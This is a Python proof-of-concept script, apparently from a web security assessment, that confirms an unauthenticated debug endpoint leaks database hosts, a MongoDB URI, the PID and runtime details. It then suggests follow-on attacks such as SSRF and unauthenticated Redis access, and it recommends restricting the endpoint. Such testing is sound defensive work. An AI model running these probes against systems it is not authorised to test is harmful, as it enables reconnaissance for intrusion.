#!/usr/bin/env python3
"""
WSTG-CONF-08: Debug Information Leak via /api/debug/info

Vulnerability: The endpoint GET /api/debug/info is accessible without any
authentication. It exposes sensitive internal configuration including:

- Node.js version
- Process ID (PID)
- PostgreSQL database host and connection details
- Redis host
- MongoDB connection URI (including host, port, and database name)
- Server uptime
- Memory usage details
- Platform/OS information
- Environment name

This endpoint is defined in src/index.js as a "quick diagnostic endpoint
for ops team debugging" with no auth middleware.

Impact: Information disclosure enabling further attacks. Database hosts,
connection strings, and internal architecture details help an attacker
map the internal network and identify additional attack surfaces.
"""

import requests
import json

BASE_URL = "http://localhost:3000"


def main():
    print("=" * 70)
    print("WSTG-CONF-08: Debug Information Leak - /api/debug/info")
    print("=" * 70)

    # Step 1: Access the debug endpoint without authentication
    print("\n[1] Accessing GET /api/debug/info without authentication...")
    resp = requests.get(f"{BASE_URL}/api/debug/info")

    print(f"    Status: {resp.status_code}")

    if resp.status_code == 200:
        info = resp.json()

        print(f"\n    [VULNERABLE] Debug endpoint is publicly accessible!\n")
        print(f"    Leaked information:")
        print(f"    {'-' * 50}")
        print(f"    Node Version:   {info.get('node_version', 'N/A')}")
        print(f"    Environment:    {info.get('environment', 'N/A')}")
        print(f"    Platform:       {info.get('platform', 'N/A')}")
        print(f"    Process ID:     {info.get('pid', 'N/A')}")
        print(f"    Uptime:         {info.get('uptime', 'N/A')} seconds")
        print(f"    DB Host:        {info.get('db_host', 'N/A')}")
        print(f"    Redis Host:     {info.get('redis_host', 'N/A')}")
        print(f"    MongoDB URI:    {info.get('mongo_uri', 'N/A')}")

        memory = info.get("memory", {})
        if memory:
            print(f"\n    Memory Usage:")
            print(f"      RSS:          {memory.get('rss', 0) / 1024 / 1024:.1f} MB")
            print(f"      Heap Total:   {memory.get('heapTotal', 0) / 1024 / 1024:.1f} MB")
            print(f"      Heap Used:    {memory.get('heapUsed', 0) / 1024 / 1024:.1f} MB")
            print(f"      External:     {memory.get('external', 0) / 1024 / 1024:.1f} MB")

        # Step 2: Analyze the leaked data for attack opportunities
        print(f"\n[2] Attack surface analysis from leaked data:")

        mongo_uri = info.get("mongo_uri", "")
        if mongo_uri:
            print(f"    - MongoDB at {mongo_uri} may be reachable")
            if "localhost" in mongo_uri or "127.0.0.1" in mongo_uri:
                print(f"      -> Accessible via SSRF from /api/integrations/import")

        db_host = info.get("db_host", "")
        if db_host:
            print(f"    - PostgreSQL at {db_host} may be reachable")

        redis_host = info.get("redis_host", "")
        if redis_host:
            print(f"    - Redis at {redis_host} may be reachable")
            print(f"      -> Redis often has no authentication by default")

        env = info.get("environment", "")
        if env and env != "production":
            print(f"    - Environment is '{env}' - may have debug features enabled")

        pid = info.get("pid", "")
        if pid:
            print(f"    - Process ID {pid} could be used for PID-based attacks")

    else:
        print(f"    Endpoint returned {resp.status_code}")
        print(f"    Response: {resp.text[:200]}")

    # Step 3: Compare with the health check endpoint
    print(f"\n[3] Comparing with health check endpoint...")
    health_resp = requests.get(f"{BASE_URL}/api/health")
    print(f"    /api/health status: {health_resp.status_code}")
    if health_resp.status_code == 200:
        health_data = health_resp.json()
        print(f"    Health check returns: {json.dumps(health_data)}")
        print(f"    Health check is safe - only returns status and timestamp.")
        print(f"    Debug endpoint leaks far more sensitive information.")

    # Summary
    print("\n" + "=" * 70)
    print("RESULT: Debug information leak confirmed.")
    print("  - GET /api/debug/info requires no authentication")
    print("  - Exposes database hosts, MongoDB URI, Node version, PID")
    print("  - Internal infrastructure details enable further attacks")
    print("  - Should be removed or restricted to authenticated admins")
    print("=" * 70)


if __name__ == "__main__":
    main()
